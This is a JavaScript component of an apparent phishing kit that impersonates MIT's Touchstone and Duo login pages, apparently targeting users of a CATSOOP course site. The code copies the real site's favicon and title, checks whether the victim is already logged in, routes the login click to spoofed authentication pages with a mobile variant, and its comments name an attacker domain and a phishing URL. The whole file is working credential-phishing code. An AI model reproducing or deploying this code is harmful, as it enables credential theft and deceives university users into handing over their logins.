// Note: all this js will be loaded in double quotes, 
// so must escape use single quotes or esacaped double quotes

/* Injected Constants */
// var DOMAIN       = attacker domain
// var ORIG_DOM     = origianl catsoop domain url
// var FINAL_DOM;   = final catsoop domain url
// var PHISHING_URL = fishing url

// If logged in already, tell payload to exit
if (window.localStorage.getItem('loggedIn') == 'true')
    window.parent.postMessage('exit', '*')

// get favicon url
var q = document.querySelectorAll('[rel=\'icon\']');
var icon = '';
if (q.length > 0) icon = q[0].href;

// get title string
var title = '';
var t = document.getElementsByTagName('title')
if (t.length > 0) title = t[0].innerHTML;

// set favicon and title
window.postMessage({'icon': icon, 'title': title}, '*');

// on login click handler
// When user clicks login bring them to the account provider 
// selection. Also respect whether it's mobile or not
window.nextWin = function nextWin() { 
    var page = 'duo.html';
    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
        .test(navigator.userAgent)) page = 'mobile-duo.html';

    window.postMessage({
        move : '/idp/Authn/' + page,
        url  : '/idp/Authn/MIT?conversation=e1s1',
        icon : '/idp/Authn/images/favicon2.ico',
        title: 'Touchstone@MIT : Please Authenticate',
        load : 1
    }, '*');
    // skip provider to get straight to the juice 
/*
    window.postMessage({
        move  : '/idp/Authn/provider/' + page, 
        icon  : '/idp/Authn/images/favicon.ico',
        title : 'Account Provider Selection', 
        url   : '/wayf/mit/DS?entityID=https%3A%2F%2Fshimmer.csail.mit.edu%2Fshibboleth&return=https%3A%2F%2Fshimmer.csail.mit.edu%2FShibboleth.sso%2FLogin%3FSAMLDS%3D1%26target%3Dss%253Amem%253Abbea589c78bbd6c91444141cde046327fb0a184e800355616848a805cda71a78&lang=en',
        load  : 1
    }, '*');*/
}; 


